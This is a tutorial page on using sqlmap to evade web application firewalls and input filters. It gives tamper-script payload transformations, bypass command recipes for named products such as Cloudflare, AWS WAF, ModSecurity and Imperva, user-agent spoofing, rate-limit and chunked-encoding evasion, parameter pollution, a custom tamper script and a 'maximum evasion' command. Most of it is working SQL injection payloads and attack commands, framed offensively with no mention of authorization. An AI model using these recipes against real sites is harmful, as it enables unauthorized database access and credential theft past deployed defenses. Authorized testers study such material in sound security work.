---
title: 'Bypassing Web Application Protections'
description: 'Evade WAFs, IDS/IPS, and application-level filters using tamper scripts, encoding techniques, chunked transfer, and custom evasion strategies.'
icon: material/shield-off
tags:
  - sqlmap
  - waf-bypass
  - tamper-scripts
  - evasion
---

# Bypassing Web Application Protections

In the real world, your targets will have defenses. WAFs, input filters, parameterized logging, rate limiters — all designed to stop SQL injection. This section teaches you how to get past every one of them.

---

## Identifying the WAF

Before bypassing a WAF, identify it:

```bash title="Automatic WAF identification"
sqlmap -r request.txt --identify-waf --batch
```

```text title="Example Output"
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] heuristics detected that the target is protected by 'Cloudflare'
```

SQLMap can detect 50+ WAF products including:

- Cloudflare
- AWS WAF
- ModSecurity / OWASP CRS
- Akamai Kona
- F5 BIG-IP ASM
- Imperva / Incapsula
- Barracuda WAF
- Sucuri
- Fortinet FortiWeb
- Citrix NetScaler

---

## Tamper Scripts — Your WAF Bypass Toolkit

Tamper scripts are Python modules that **modify SQLMap's payloads** before they're sent. They transform the SQL syntax to evade pattern-matching rules.

### Using Tamper Scripts

```bash title="Single tamper script"
sqlmap -r request.txt --tamper=space2comment --batch
```

```bash title="Multiple tamper scripts (chained)"
sqlmap -r request.txt --tamper=space2comment,between,randomcase --batch
```

### How Tamper Scripts Work

A tamper script receives the raw payload and returns a modified version:

**Original payload:**
```sql
1 AND 1=1 UNION SELECT username,password FROM users-- -
```

**After `space2comment`:**
```sql
1/**/AND/**/1=1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--/**/-
```

**After `randomcase`:**
```sql
1 AnD 1=1 uNiOn SeLeCt username,password FrOm users-- -
```

**After `between`:**
```sql
1 AND 1 NOT BETWEEN 0 AND 0 UNION SELECT username,password FROM users-- -
```

---

## Complete Tamper Script Reference

### Whitespace Evasion

These replace spaces with alternative characters that SQL engines accept:

| Script | Transformation | Example |
|---|---|---|
| `space2comment` | Space → `/* */` | `1/**/AND/**/1=1` |
| `space2plus` | Space → `+` | `1+AND+1=1` |
| `space2dash` | Space → `--\n` | `1--\nAND--\n1=1` |
| `space2hash` | Space → `#\n` (MySQL) | `1#\nAND#\n1=1` |
| `space2morehash` | Space → `#random\n` | `1#aB2\nAND#xY9\n1=1` |
| `space2mssqlblank` | Space → random blank char | MSSQL whitespace chars |
| `space2mssqlhash` | Space → `%23\n` | MSSQL specific |
| `space2mysqlblank` | Space → MySQL blank chars | `\t`, `\n`, `\r`, etc. |
| `space2randomblank` | Space → random whitespace | Tab, newline, etc. |

### Keyword Evasion

These modify SQL keywords to bypass pattern matching:

| Script | Transformation | Example |
|---|---|---|
| `randomcase` | Random case keywords | `sElEcT`, `UnIoN` |
| `randomcomments` | Insert comments in keywords | `UN/**/ION SE/**/LECT` |
| `versionedkeywords` | MySQL versioned comments | `/*!UNION*/ /*!SELECT*/` |
| `versionedmorekeywords` | More versioned keywords | `/*!50000UNION*/ /*!50000SELECT*/` |
| `halfversionedmorekeywords` | Half-version comments | `/*!0UNION*/ SELECT` |

### Comparison Evasion

These change how comparisons are expressed:

| Script | Transformation | Original → Modified |
|---|---|---|
| `between` | `>` → `NOT BETWEEN 0 AND` | `a>1` → `a NOT BETWEEN 0 AND 1` |
| `greatest` | `>` → `GREATEST` | `a>1` → `GREATEST(a,2)=a` |
| `equaltolike` | `=` → `LIKE` | `a=1` → `a LIKE 1` |
| `least` | `>` → `LEAST` | `a>1` → `LEAST(a,2)=2` |

### Encoding Evasion

These encode the payload to bypass character filters:

| Script | Transformation | Example |
|---|---|---|
| `charencode` | URL encode all chars | `%53%45%4C%45%43%54` |
| `chardoubleencode` | Double URL encode | `%2553%2545%254C...` |
| `charunicodeencode` | Unicode encode | `%u0053%u0045%u004C...` |
| `htmlencode` | HTML entity encode | `&#83;&#69;&#76;...` |
| `base64encode` | Base64 encode payload | `U0VMRUNUIG...` |
| `hex2char` | Replace hex with CHAR() | `0x61` → `CHAR(97)` |

### Function/Syntax Evasion

| Script | Transformation | Purpose |
|---|---|---|
| `commalesslimit` | `LIMIT 0,1` → `LIMIT 1 OFFSET 0` | Bypass comma filtering |
| `commalessmid` | `MID(a,1,1)` → `MID(a FROM 1 FOR 1)` | Bypass comma filtering |
| `concat2concatws` | `CONCAT()` → `CONCAT_WS()` | Alternative concatenation |
| `ifnull2ifisnull` | `IFNULL()` → `IF(ISNULL())` | Alternative null check |
| `symboliclogical` | `AND` → `&&`, `OR` → `\|\|` | Use symbols instead of keywords |

### Special Purpose

| Script | Purpose |
|---|---|
| `apostrophenullencode` | Encode `'` as `%00%27` — bypasses some quote filters |
| `percentage` | Add `%` before each char — IIS/ASP specific |
| `sp_password` | Append `sp_password` to hide from MSSQL logs |
| `unmagicquotes` | Bypass PHP `magic_quotes` with multi-byte encoding |
| `escapequotes` | Escape quotes with backslash |

### List All Available Tamper Scripts

```bash
sqlmap --list-tampers
```

---

## WAF-Specific Bypass Recipes

### Cloudflare

```bash
sqlmap -r request.txt \
  --tamper=charencode,space2comment,randomcase \
  --random-agent \
  --delay=2 \
  --batch
```

### ModSecurity / OWASP CRS

```bash
sqlmap -r request.txt \
  --tamper=modsecurityversioned,space2comment,between,randomcase \
  --random-agent \
  --batch
```

### AWS WAF

```bash
sqlmap -r request.txt \
  --tamper=space2comment,randomcase,charencode \
  --random-agent \
  --delay=1 \
  --batch
```

### F5 BIG-IP ASM

```bash
sqlmap -r request.txt \
  --tamper=space2randomblank,between,percentage \
  --random-agent \
  --batch
```

### Imperva / Incapsula

```bash
sqlmap -r request.txt \
  --tamper=space2comment,randomcase,chardoubleencode \
  --random-agent \
  --delay=3 \
  --batch
```

### IIS/ASP.NET

```bash
sqlmap -r request.txt \
  --tamper=percentage,charunicodeencode,space2mssqlblank \
  --random-agent \
  --batch
```

---

## User-Agent Randomization

WAFs often block known scanner User-Agents. SQLMap's default User-Agent is:

```
sqlmap/1.x.x (https://sqlmap.org)
```

This will get you blocked immediately. Fix it:

```bash title="Use a random browser User-Agent"
sqlmap -r request.txt --random-agent --batch
```

```bash title="Use a specific User-Agent"
sqlmap -r request.txt \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  --batch
```

---

## Rate Limiting Evasion

### Adding Delays

```bash title="Fixed delay (1 second)"
sqlmap -r request.txt --delay=1 --batch
```

```bash title="Longer delays for aggressive WAFs"
sqlmap -r request.txt --delay=3 --batch
```

### Safe URL Pattern

Visit a "normal" page periodically to look like regular browsing:

```bash
sqlmap -r request.txt \
  --safe-url="http://target.com/" \
  --safe-freq=5 \
  --batch
```

---

## Chunked Transfer Encoding

Some WAFs only inspect the first chunk of a request. SQLMap can split the body into multiple HTTP chunks:

```bash
sqlmap -r request.txt --chunked --batch
```

This sends the request with `Transfer-Encoding: chunked`, splitting the payload across multiple TCP segments that the WAF may not reassemble correctly.

---

## HTTP Parameter Pollution (HPP)

Some applications and WAFs handle duplicate parameters differently:

```bash title="Sending the same parameter twice"
sqlmap -u "http://target.com/page?id=1" --hpp --batch
```

This exploits differences in how the WAF and the application handle duplicate parameters. For example:

- **WAF sees:** `id=1` (first value) — clean!
- **Application uses:** `id=1 UNION SELECT...` (last value) — injected!

---

## Writing Custom Tamper Scripts

If none of the built-in tamper scripts work, write your own:

```python title="tamper/custom_bypass.py"
#!/usr/bin/env python3
"""Custom tamper script for bypassing a specific WAF."""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces 'SELECT' with 'SEL/**/ECT' and
    'UNION' with 'UN/**/ION'
    """
    if payload:
        payload = payload.replace("SELECT", "SEL/**/ECT")
        payload = payload.replace("UNION", "UN/**/ION")
        payload = payload.replace("FROM", "FR/**/OM")
        payload = payload.replace(" ", "/**/")
    return payload
```

Save this to `tamper/custom_bypass.py` in the SQLMap directory, then:

```bash
sqlmap -r request.txt --tamper=custom_bypass --batch
```

---

## When All Else Fails — The Nuclear Approach

If you still can't bypass the WAF:

```bash title="Maximum evasion configuration"
sqlmap -r request.txt \
  --level=5 \
  --risk=3 \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent \
  --delay=3 \
  --safe-url="http://target.com/" \
  --safe-freq=3 \
  --hpp \
  --chunked \
  --technique=BT \
  --time-sec=10 \
  --threads=1 \
  --batch \
  -v 3
```

!!! tip "Blind Techniques Are Harder to Block"

    Boolean-based and time-based blind injection payloads are much simpler than UNION or error-based payloads. They often bypass WAFs that block `UNION`, `SELECT`, and other keywords. Consider using `--technique=BT` when other techniques are blocked.
